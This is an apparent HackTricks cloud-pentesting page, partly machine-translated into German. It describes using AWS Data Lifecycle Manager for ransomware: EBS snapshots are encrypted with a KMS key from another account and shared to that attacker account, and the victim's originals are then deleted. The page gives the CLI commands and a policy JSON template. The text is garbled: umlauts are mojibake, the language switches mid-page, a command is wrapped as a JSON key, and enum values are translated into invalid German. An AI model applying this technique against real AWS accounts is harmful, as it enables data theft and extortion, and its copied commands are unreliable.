# AWS - Datenlebenszyklus-Manager

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks in PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Datenlebenszyklus-Manager (DLM)

### `EC2:DescribeVolumes`, `DLM:CreateLifeCyclePolicy`

Ein Ransomware-Angriff kann ausgef√ºhrt werden, indem so viele EBS-Volumes wie m√∂glich verschl√ºsselt und dann die aktuellen EC2-Instanzen, EBS-Volumes und Snapshots gel√∂scht werden. Um diese b√∂sartige Aktivit√§t zu automatisieren, kann man Amazon DLM verwenden, um die Snapshots mit einem KMS-Schl√ºssel aus einem anderen AWS-Konto zu verschl√ºsseln und die verschl√ºsselten Snapshots an ein anderes Konto zu √ºbertragen. Alternativ k√∂nnen Snapshots ohne Verschl√ºsselung an ein von ihnen verwaltetes Konto √ºbertragen und dort verschl√ºsselt werden. Obwohl es nicht direkt m√∂glich ist, bestehende EBS-Volumes oder Snapshots zu verschl√ºsseln, kann dies durch Erstellen eines neuen Volumes oder Snapshots erfolgen.

Zun√§chst wird ein Befehl verwendet, um Informationen zu Volumes zu sammeln, wie z. B. Instanz-ID, Volumen-ID, Verschl√ºsselungsstatus, Anlagenstatus und Volumenart.
```aws ec2 describe-volumes```

Secondly, one will create the lifecycle policy. This command employs the DLM API to set up a lifecycle policy that automatically takes daily snapshots of specified volumes at a designated time. It also applies specific tags to the snapshots and copies tags from the volumes to the snapshots. The policyDetails.json file includes the lifecycle policy's specifics, such as target tags, schedule, the ARN of the optional KMS key for encryption, and the target account for snapshot sharing, which will be recorded in the victim's CloudTrail logs.


```bash
```json
{
  "aws dlm create-lifecycle-policy": "--description \"Meine erste Richtlinie\" --state ENABLED --execution-role-arn arn:aws:iam::12345678910:role/AWSDataLifecycleManagerDefaultRole --policy-details file://policyDetails.json"
}
```
```

A template for the policy document can be seen here:
```bash
```json
{
"PolicyType": "EBS_SNAPSHOT_MANAGEMENT",
"ResourceTypes": [
"VOLUME"
],
"TargetTags": [
{
"Key": "BeispielSchl√ºssel",
"Value": "BeispielWert"
}
],
"Schedules": [
{
"Name": "T√§glicheSnapshots",
"CopyTags": true,
"TagsToAdd": [
{
"Key": "SnapshotErsteller",
"Value": "DLM"
}
],
"VariableTags": [
{
"Key": "Kostenstelle",
"Value": "Finanzen"
}
],
"CreateRule": {
"Interval": 24,
"IntervalUnit": "STUNDEN",
"Times": [
"03:00"
]
},
"RetainRule": {
"Count": 14
},
"FastRestoreRule": {
"Count": 2,
"Interval": 12,
"IntervalUnit": "STUNDEN"
},
"CrossRegionCopyRules": [
{
"TargetRegion": "us-west-2",
"Encrypted": true,
"CmkArn": "arn:aws:kms:us-west-2:123456789012:key/your-kms-key-id",
"CopyTags": true,
"RetainRule": {
"Interval": 1,
"IntervalUnit": "TAGE"
}
}
],
"ShareRules": [
{
"TargetAccounts": [
"123456789012"
],
"UnshareInterval": 30,
"UnshareIntervalUnit": "TAGE"
}
]
}
],
"Parameters": {
"ExcludeBootVolume": false
}
}
```
```

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
